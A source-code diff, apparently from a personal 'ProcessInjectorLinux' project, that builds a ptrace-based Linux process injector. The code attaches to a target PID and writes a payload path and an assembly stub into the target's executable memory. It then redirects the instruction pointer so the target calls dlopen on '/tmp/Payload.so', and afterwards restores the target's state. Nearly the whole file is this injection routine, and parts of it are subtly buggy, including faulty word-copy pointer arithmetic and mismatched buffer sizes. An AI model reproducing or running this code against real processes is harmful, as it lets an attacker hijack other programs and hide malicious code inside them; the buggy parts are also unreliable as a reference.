@@ -1,7 +1,6 @@
-#include <cstdlib>
 #include "Injection.h"
 
-void* PayloadPath = (void *) "/home/kourosh/CLionProjects/ProcessInjectorLinux/Payload.so";
+//void* PayloadPath = (void *) "/home/kourosh/CLionProjects/ProcessInjectorLinux/Payload.so";
 
 int main() {
 
@@ -11,7 +10,7 @@ int main() {
     void* localDlopenAddress = nullptr;
     void* remoteDlopenAddress = nullptr;
 
-    pid_t PID = 2591;
+    pid_t PID = 27067;
 
     // Load libdl-2.27 in out process
     libdlAddr = dlopen("libdl-2.27.so", RTLD_LAZY);
@@ -86,9 +85,13 @@ void* FindLibraryAddress(pid_t PID, const char* LibraryName){
 
 }
 
-int Inject(int PID, void* dlopenAddr){
+
+
+bool Inject(pid_t PID, void* dlopenAddr){
 
     struct user_regs_struct OldRegs{}, regs{};
+    int status;
+
     printf("[+] Tracing process with PID: %d\n", PID);
     sleep(2);
 
@@ -107,45 +110,107 @@ int Inject(int PID, void* dlopenAddr){
 
     memcpy(&regs, &OldRegs, sizeof(user_regs_struct));
 
-    int oldCodesSize = 8192;
-    auto* oldCodes = (unsigned char*)malloc(oldCodesSize);
+    int oldCodesSize = 9076;
+    unsigned char* oldCodes = (unsigned char*)malloc(oldCodesSize);
 
     void* freeAddress = FindExecutableSpace(PID);
 
-//    int ReadSuccess = ReadFromTargetMemory(PID, (unsigned long long)dlopenAddr, oldCodes, oldCodesSize);
-
-
-
-    printf("[+] Detaching target process\n");
-
-    if( ptrace(PTRACE_DETACH, PID, NULL, NULL) < 0){
-        perror("ptrace(DETACH)");
-        return -1;
+    if (!ReadFromTargetMemory(PID, (unsigned long long)dlopenAddr, oldCodes, oldCodesSize)){
+        printf("ReadFromMemory failed!\n");
+        return false;
     }
-//    system("PAUSE");
-    printf("%d\n", getpid());
-    sleep(2000);
 
-    return 0;
+    WriteToMemory(PID, (unsigned long long)freeAddress, (void*)"/tmp/Payload.so\x00", 24);
+    WriteToMemory(PID, (unsigned long long)freeAddress + 24, (void*)"\x90\x90\x90\x90\x90\x90\x90", 8);
+    WriteToMemory(PID, (unsigned long long)freeAddress + 24 + 8, (long*)(&injectme) + 4, 32);
+
+    // Set rip to point to our code
+    regs.rip = (unsigned long long) freeAddress + 24 + 8;
+
+    // Set rax to point to API call dlopen() address
+    regs.rax = (unsigned long long) dlopenAddr;
+
+    // Set rdi to point to our payload path
+    regs.rdi = (unsigned long long) freeAddress;
+
+    // Set rsi as RTLD_LAZY for dlopen() call
+    regs.rsi = 2;
+
+    // Set new regs in target process
+    ptrace(PTRACE_SETREGS, PID, NULL, &regs);
+
+    ptrace(PTRACE_CONT, PID, NULL, NULL);
+    waitpid(PID, &status, WUNTRACED);
+
+    if (WIFSTOPPED(status) && WSTOPSIG(status) ==SIGTRAP){
+
+        // Get process Registers, if injection succeed or not
+        ptrace(PTRACE_GETREGS, PID, NULL, &regs);
+        if ( regs.rax != 0x0 ){
+            printf("[*] Injected payload loaded at address: %p", (void*)regs.rax);
+        } else{
+            printf("[!] Payload could not be injected\n");
+            return false;
+        }
+
+        // Restore target program back to original state
+        // Copy old code back to target process memory
+        WriteToMemory(PID, (unsigned long long)freeAddress, oldCodes, 8192);
+
+        // Set old registers
+        ptrace(PTRACE_SETREGS, PID, NULL, &OldRegs);
+
+        //
+        printf("[+] Detaching target process\n");
+
+        if( ptrace(PTRACE_DETACH, PID, NULL, NULL) < 0){
+            perror("ptrace(DETACH)");
+            return -1;
+        }
+    } else {
+        printf("[!] Fatal Error: Process stopped for unknown reason!");
+        return false;
+    }
+
+//    printf("%d\n", getpid());
+//    sleep(2000);
+
+    return true;
 }
 
-int ReadFromTargetMemory(pid_t PID, unsigned long long addr, void* data, int len){
+bool ReadFromTargetMemory(pid_t PID, unsigned long long addr, void* data, int len){
 
     char* ptr = (char*) data;
-    long word;
+    long word = 0;
 
     for (int i = 0; i < len; i += sizeof(word), word=0){
         if ((word = ptrace(PTRACE_PEEKTEXT, PID, addr + i, NULL)) == -1){
             printf("Error reading from addr %p\n", (void*)(addr+i) );
             ptrace(PTRACE_DETACH, PID, NULL, NULL);
-            return -1;
+            return false;
         }
 
         ptr[i] = word;
+        printf("%d) read from address %p : %p\n", i, (void*)(addr+i), (void*)word);
 
     }
 
-    return 0;
+    return true;
+
+}
+
+bool WriteToMemory(pid_t PID, unsigned long long addr, void* data, int len){
+
+    long word;
+
+    for (int i = 0; i < len; i += sizeof(word), word = 0){
+        memcpy(&word, (long*)data + i, sizeof(word));
+        if (ptrace(PTRACE_POKETEXT, PID, addr + i, word) == -1){
+            printf("Error writing data to address %p\n", (addr+i));
+            return false;
+        }
+    }
+    return true;
 
 }
 
@@ -171,7 +236,14 @@ void* FindExecutableSpace(pid_t PID){
 
     fclose(fd);
 
-    printf("address : %p\n", (void*)address);
+    printf("free address : %p\n", (void*)address);
     return address;
 
+}
+
+void injectme(void){
+    asm("mov $2, %esi\n"
+        "call *%rax\n"
+        "int $0x03\n"
+    );
 }
